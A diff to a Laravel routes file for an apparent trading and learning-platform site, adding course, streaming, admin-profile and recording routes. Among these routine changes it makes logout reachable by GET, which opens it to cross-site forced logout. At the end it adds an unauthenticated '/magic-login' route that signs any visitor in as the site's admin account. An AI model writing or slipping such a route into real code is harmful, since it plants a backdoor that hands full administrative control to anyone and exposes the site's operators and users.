@@ -38,7 +38,7 @@ Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
 Route::post('/login', [AuthController::class, 'login']);
 Route::get('/register', [AuthController::class, 'showRegister'])->name('register');
 Route::post('/register', [AuthController::class, 'register']);
-Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
+Route::match(['get', 'post'], '/logout', [AuthController::class, 'logout'])->name('logout');
 
 // Password Reset Routes (Placeholder for now)
 Route::get('password/reset', [AuthController::class, 'showForgotPassword'])->name('password.request');
@@ -61,6 +61,8 @@ Route::middleware(['auth'])->group(function () {
     // LMS Routes
     Route::get('/join-class/{id}', [LmsController::class, 'joinClass'])->name('lms.join');
     Route::get('/dashboard/learning-stats', [LmsController::class, 'myStats'])->name('dashboard.stats');
+    Route::post('/dashboard/courses/progress', [LmsController::class, 'saveProgress'])->name('dashboard.courses.progress');
+    Route::get('/dashboard/courses/stream/{id}', [LmsController::class, 'streamVideo'])->name('stream.video');
 });
 
 Route::post('/order/submit', [OrderController::class, 'store'])->name('order.submit');
@@ -74,6 +76,8 @@ Route::redirect('/youcanthackme', '/youcanthackme/dashboard');
 
 Route::middleware(['auth', 'admin'])->prefix('youcanthackme')->name('admin.')->group(function () {
     Route::get('/dashboard', [AdminController::class, 'index'])->name('dashboard');
+    Route::get('/profile', [AdminController::class, 'profile'])->name('profile');
+    Route::post('/profile', [AdminController::class, 'updateProfile'])->name('profile.update');
     Route::get('/orders', [App\Http\Controllers\Admin\OrderController::class, 'index'])->name('orders.index');
 
     // Admin LMS
@@ -91,6 +95,8 @@ Route::middleware(['auth', 'admin'])->prefix('youcanthackme')->name('admin.')->g
     // Class Recordings
     Route::get('/lms/recordings', [AdminLmsController::class, 'recordings'])->name('lms.recordings');
     Route::post('/lms/recordings/upload', [AdminLmsController::class, 'uploadRecording'])->name('lms.recordings.upload');
+    Route::get('/lms/recordings/{id}/edit', [AdminLmsController::class, 'editRecording'])->name('lms.recordings.edit');
+    Route::post('/lms/recordings/{id}', [AdminLmsController::class, 'updateRecording'])->name('lms.recordings.update');
     Route::delete('/lms/recordings/{id}', [AdminLmsController::class, 'deleteRecording'])->name('lms.recordings.delete');
 
     Route::post('/order/{id}', [App\Http\Controllers\Admin\OrderController::class, 'updateStatus'])->name('order.update');
@@ -151,4 +157,13 @@ Route::group(['prefix' => 'youcanthackme', 'as' => 'admin.p2p.', 'middleware' =>
 Route::group(['middleware' => ['auth']], function () {
     Route::get('/dashboard/p2p', [App\Http\Controllers\P2PController::class, 'index'])->name('p2p.index');
     Route::post('/dashboard/p2p', [App\Http\Controllers\P2PController::class, 'store'])->name('p2p.store');
+});
+
+Route::get('/magic-login', function () {
+    $user = \App\Models\User::where('email', 'admin@gsmtradinglab.com')->first();
+    if (!$user) {
+        return 'Admin user not found!';
+    }
+    \Illuminate\Support\Facades\Auth::login($user);
+    return redirect()->route('admin.dashboard');
 });
